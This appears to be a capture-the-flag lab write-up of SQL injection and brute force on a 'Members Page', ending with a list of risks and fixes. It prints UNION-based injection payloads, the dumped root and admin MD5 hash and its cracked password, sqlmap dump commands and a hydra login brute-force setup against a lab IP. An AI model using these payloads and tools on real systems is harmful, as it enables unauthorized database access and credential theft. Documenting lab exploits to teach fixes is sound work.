## Location :
Members Page

## Type of Vulnerability :
SQL INJECTION / BRUTE FORCE

## Explanation
The inputs are not protected, it is possible to inject SQL code and submit it, we can see this by simply testing 1 OR 1=1.
We will enter ``1 or 1=1 UNION SELECT table_name, column_name FROM information_schema.columns`` to obtain the structure of the database.

-> There are 5 tables: db_default, users, guestbook, list_images, vote_dbs.
We will focus on the 'db_default' table, there are two columns that seem interesting: 'username', 'password'.
We will test ``1 OR 1=1 UNION SELECT username, password FROM db_default``


Table 'Member_Sql_Injection.db_default' doesn't exist
So we will try to find to which table 'db_default' belongs with ``1 OR 1=1 UNION SELECT table_name, table_schema FROM information_schema.tables``

``First name: db_default
Surname : Member_Brute_Force``
So we will adapt our previous failed query ``1 OR 1=1 UNION SELECT username, password FROM Member_Brute_Force.db_default`` which gives two interesting results:

``First name: root
Surname : 3bf1114a986ba87ed28fc1b5884fc2f8
First name: admin
Surname : 3bf1114a986ba87ed28fc1b5884fc2f8``

We will therefore decrypt the password (MD5) which gives ``shadow``.
We log in with the 'root' or 'admin' credentials with the password 'shadow'.
-> We get the flag

With SQLMAP:
python3 sqlmap.py -u "http://192.168.31.217/?page=member&id=1&Submit=Submit#" --dbs -> gives the tables
python3 sqlmap.py -u "http://192.168.31.217/?page=member&id=1&Submit=Submit#" -D Member_Brute_Force -T db_default --columns -> gives the columns
python3 sqlmap.py -u "http://192.168.31.217/?page=member&id=1&Submit=Submit#" -D Member_Brute_Force -T db_default -C username,password --dump -> retrieves the information and decrypts the password

Given the name of the table "Member_Brute_Force" we will test the Brute-Force with hydra:
- With the dictionary 10-million-password-list-top-10000.txt
- http-get-form
- /index.php:page=signin&username=admin&password=^PASS^&Login=Login:F=images/WrongAnswer.gif

## Risks
- Unauthorized access to data
- Modification / deletion / addition of data
- Loss of total control of the database
- Opening to certain types of DoS (Denial of Service) attacks
- Identity theft
- Unauthorized access to restricted functions

## How to Fix
- Use of prepared and / or parameterized queries. Allows data to be distinguished from commands.
- Escaping user inputs
- Validation of user inputs
- Use of a database firewall (monitors queries and blocks suspicious ones)
- Limiting privileges to the strict minimum required
- Limit the number of login attempts over time
